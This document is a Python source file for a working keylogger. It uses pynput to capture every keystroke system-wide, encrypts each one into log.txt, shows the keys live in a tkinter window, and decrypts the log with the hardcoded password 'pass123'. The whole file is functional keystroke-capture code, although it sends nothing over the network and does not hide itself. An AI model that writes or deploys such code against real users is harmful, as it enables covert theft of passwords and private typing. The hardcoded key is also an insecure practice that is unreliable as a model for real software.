#!/usr/bin/env python
import pynput
from pynput import keyboard
import tkinter as tk
from tkinter import simpledialog, messagebox
import time, json
from text_encryption import encrypt, decrypt # for secure logging

log_listbox = None # global var
Decryption_key = "pass123"  # hardcoded Decryption_key

def append_to_log(string):
    string = f"[{time.strftime('%H:%M:%S')}] {string}"

    encrypted = encrypt(string)

    with open("log.txt", "a") as file:
        file.write(json.dumps(encrypted) + "\n")

    # updating GUI
    if log_listbox:
        log_listbox.after(0, lambda: (
            log_listbox.insert(tk.END, string),
            log_listbox.see(tk.END)
        ))

def process_key_press(key):
    try:
        current_key = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            current_key = " "
        else:
            current_key = " "+ str(key) + " "

    append_to_log(current_key)

def decrypt_logs():
    password = simpledialog.askstring("Decryption_key", "Enter Decryption_key:", show='*')

    if password != Decryption_key:
        messagebox.showerror("Error", "Wrong Decryption_key")
        return

    decrypted_lines = []

    try:
        with open("log.txt", "r") as file:
            for line in file:
                try:
                    encrypted_entry = json.loads(line.strip())
                    decrypted_text = decrypt(encrypted_entry)
                    decrypted_lines.append(decrypted_text)
                except Exception:
                    decrypted_lines.append("[Corrupted Entry]")

        #file with decrypted data
        with open("decrypted_log.txt", "w") as file:
            for line in decrypted_lines:
                file.write(line + "\n")

        messagebox.showinfo("Success", "Decrypted log saved as decrypted_log.txt")

    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found")

def gui():
    global log_listbox
    
    root = tk.Tk()
    root.geometry("800x500")
    root.title("Log Viewer")

    frame = tk.Frame(root)
    frame.pack(fill=tk.BOTH, expand=True)

    decrypt_button = tk.Button(root, text="Decrypt Logs", command=decrypt_logs)
    decrypt_button.pack(pady=5)

    scrollbar = tk.Scrollbar(frame)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    log_listbox = tk.Listbox(frame, yscrollcommand=scrollbar.set)
    log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    scrollbar.config(command=log_listbox.yview)
   

    root.mainloop()


def start():
    keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
    keyboard_listener.start()
    gui()

start()